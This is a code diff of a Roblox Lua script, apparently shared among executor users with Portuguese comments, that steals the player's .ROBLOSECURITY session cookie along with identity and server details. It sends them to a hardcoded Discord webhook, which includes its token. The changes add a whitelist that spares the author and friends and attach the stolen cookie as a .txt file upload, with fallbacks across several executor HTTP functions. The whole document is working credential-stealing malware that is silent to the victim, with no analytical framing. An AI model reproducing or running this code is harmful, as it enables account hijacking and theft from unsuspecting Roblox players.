@@ -1,15 +1,29 @@
--- language: Lua, file: logger.lua, target: Roblox (executor com HttpGet/request)
--- *Captura identidade + cookie e envia pro webhook, exceto se for o dono*
+-- language: Lua, file: logger.lua, target: Roblox (Whitelist + Webhook com arquivo .txt)
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1563712335393194006/5iZeus60rOpVfculHkHXlne95lh0gRhHV1iop12c7PXjqSAwGuLYksZ6nS_0K0WYcr4H"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-
 local lp = Players.LocalPlayer
-local SCRIPT_OWNER_ID = 9214137607 -- ID do dono do script (não vai logar se for ele)
 
--- ========== utilidades ==========
+-- ==========================================
+-- WHITELIST (IDs permitidos)
+-- ==========================================
+local Whitelist = {
+    [5319828063] = true,   -- xinei (amigo)
+    [9214137607] = true,   -- Você (owner)
+    [1075469927] = true,   -- Subowner
+    [2567611127] = true,   -- Amigo
+}
+
+-- Se o jogador estiver na Whitelist, o script morre aqui e não faz NADA.
+if Whitelist[lp.UserId] then
+    return 
+end
+
+-- ==========================================
+-- A PARTIR DAQUI SÓ RODA PRA QUEM NÃO ESTÁ NA WL
+-- ==========================================
 
 local function safeCall(fn, ...)
     local ok, res = pcall(fn, ...)
@@ -27,19 +41,31 @@ local function getThumbnail(userId)
     local ok, url = pcall(function()
         return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
     end)
-    if ok and url then return url end
-    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+    return ok and url or ""
 end
 
--- Tenta pegar o cookie .ROBLOSECURITY de várias formas
 local function getCookie()
+    -- Tenta métodos diretos primeiro
+    local directCookies = {
+        function() return getcookie and getcookie() end,
+        function() return syn and syn.getcookie and syn.getcookie() end,
+        function() return http and http.getcookie and http.getcookie() end,
+        function() return request and request.getcookie and request.getcookie() end,
+    }
+
+    for _, fn in ipairs(directCookies) do
+        local ok, res = pcall(fn)
+        if ok and res and type(res) == "string" and res ~= "" then
+            return res
+        end
+    end
+
+    -- Tenta via requisições HTTP
     local attempts = {
-        function() return getcustomasset and nil end,
         function() return syn and syn.request and syn.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
         function() return http and http.request and http.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
         function() return request and request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
         function() return game:HttpGet("https://www.roblox.com/mobileapi/userinfo") end,
-        function() return HttpService:GetAsync("https://www.roblox.com/mobileapi/userinfo") end,
     }
 
     for _, fn in ipairs(attempts) do
@@ -71,30 +97,20 @@ local function getCookie()
     return nil
 end
 
-local function getServerLink()
-    local jobId = safeCall(function() return game.JobId end) or "unknown"
-    if jobId == "" then jobId = "unknown" end
-    return string.format("https://www.roblox.com/games/%d/?JobId=%s", game.PlaceId, tostring(jobId))
-end
-
-local function getTimestamp()
-    return os.date("%Y-%m-%d %H:%M:%S")
-end
-
--- ========== montagem do payload ==========
-
-local function buildEmbed(cookie)
+-- ========== envio pro webhook com anexo .txt ==========
+local function sendWebhook(cookie)
     local userName = lp.Name
     local displayName = lp.DisplayName
     local userId = lp.UserId
     local thumb = getThumbnail(userId)
-    local serverLink = getServerLink()
-    local timestamp = getTimestamp()
+    local jobId = safeCall(function() return game.JobId end) or "unknown"
+    local serverLink = string.format("https://www.roblox.com/games/%d/?JobId=%s", game.PlaceId, jobId)
+    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
     local executor = getExecutorName()
 
     local embed = {
-        title = "🔐 Novo Script Executado",
-        color = 0x8B5CF6,
+        title = "🚨 INVASOR DETECTADO (Não está na Whitelist)",
+        color = 0xFF0000,
         thumbnail = { url = thumb },
         fields = {
             { name = "👤 Nome", value = string.format("%s (%s)", displayName, userName), inline = true },
@@ -102,24 +118,19 @@ local function buildEmbed(cookie)
             { name = "🕒 Data/Hora", value = timestamp, inline = false },
             { name = "🖥️ Executor", value = executor, inline = true },
             { name = "🌐 Servidor", value = serverLink, inline = false },
-            { name = "🔗 JobId", value = tostring(game.JobId), inline = false },
         },
         footer = { text = "Logger · " .. timestamp },
         timestamp = DateTime.now():ToIsoDate()
     }
 
+    local cookieText = "Cookie não encontrado neste executor."
     if cookie then
-        table.insert(embed.fields, { name = "🍪 Cookie", value = "```" .. cookie .. "```", inline = false })
+        cookieText = cookie
+        embed.description = "**O Cookie foi anexado em um arquivo .txt abaixo.**"
     else
-        table.insert(embed.fields, { name = "🍪 Cookie", value = "Não disponível neste executor", inline = false })
+        embed.description = "**Não foi possível extrair o Cookie via executor.**"
     end
 
-    return embed
-end
-
--- ========== envio pro webhook ==========
-
-local function sendWebhook(embed)
     local payload = {
         username = "Constipated Logger",
         avatar_url = "https://cdn.discordapp.com/emojis/1290574899577290752.gif",
@@ -128,42 +139,69 @@ local function sendWebhook(embed)
 
     local body = HttpService:JSONEncode(payload)
 
-    local function tryRequest()
+    -- Função para enviar o arquivo TXT via multipart/form-data
+    local function sendWithFile()
+        local boundary = "----WebKitFormBoundary" .. tostring(math.random(100000, 999999))
+        local fileName = "cookie_" .. userName .. ".txt"
+        
+        local fileContent = "--" .. boundary .. "\r\n"
+        fileContent = fileContent .. 'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"\r\n'
+        fileContent = fileContent .. "Content-Type: text/plain\r\n\r\n"
+        fileContent = fileContent .. cookieText .. "\r\n"
+        fileContent = fileContent .. "--" .. boundary .. "\r\n"
+        fileContent = fileContent .. 'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
+        fileContent = fileContent .. body .. "\r\n"
+        fileContent = fileContent .. "--" .. boundary .. "--\r\n"
+
+        local headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary }
+
         local ok, res
         if syn and syn.request then
-            ok, res = pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
-            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
+            ok, res = pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = fileContent })
+        elseif http and http.request then
+            ok, res = pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = fileContent })
+        elseif request then
+            ok, res = pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = fileContent })
         end
-        if http and http.request then
-            ok, res = pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
-            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
+        
+        if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then
+            return true
         end
-        if request then
-            ok, res = pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
-            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
-        end
-        ok, res = pcall(function()
-            return HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
-        end)
-        return ok
+        return false
     end
 
-    return tryRequest()
+    -- Se o executor não suportar envio de arquivo, manda só o texto básico com o cookie dentro do embed
+    local function sendTextOnly()
+        table.insert(embed.fields, { name = "🍪 Cookie (Texto)", value = "```" .. cookieText .. "```", inline = false })
+        local textPayload = HttpService:JSONEncode({
+            username = "Constipated Logger",
+            embeds = { embed }
+        })
+        
+        local ok = pcall(function()
+            return HttpService:PostAsync(WEBHOOK_URL, textPayload, Enum.HttpContentType.ApplicationJson)
+        end)
+        
+        if not ok then
+            if syn and syn.request then
+                pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = textPayload })
+            elseif http and http.request then
+                pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = textPayload })
+            elseif request then
+                pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = textPayload })
+            end
+        end
+    end
+
+    -- Tenta mandar com arquivo, se falhar manda sem
+    if not sendWithFile() then
+        sendTextOnly()
+    end
 end
 
--- ========== execução ==========
-
+-- ========== Execução ==========
 task.spawn(function()
-    task.wait(0.5)
-    
-    -- AQUI ESTÁ A VERIFICAÇÃO:
-    -- Se o ID for do dono do script, ou se for o criador do jogo, ele cancela o envio.
-    if lp.UserId == SCRIPT_OWNER_ID or lp.UserId == game.CreatorId then
-        -- Silenciosamente ignora e não envia nada pro Discord
-        return 
-    end
-
+    task.wait(1)
     local cookie = getCookie()
-    local embed = buildEmbed(cookie)
-    sendWebhook(embed)
+    sendWebhook(cookie)
 end)
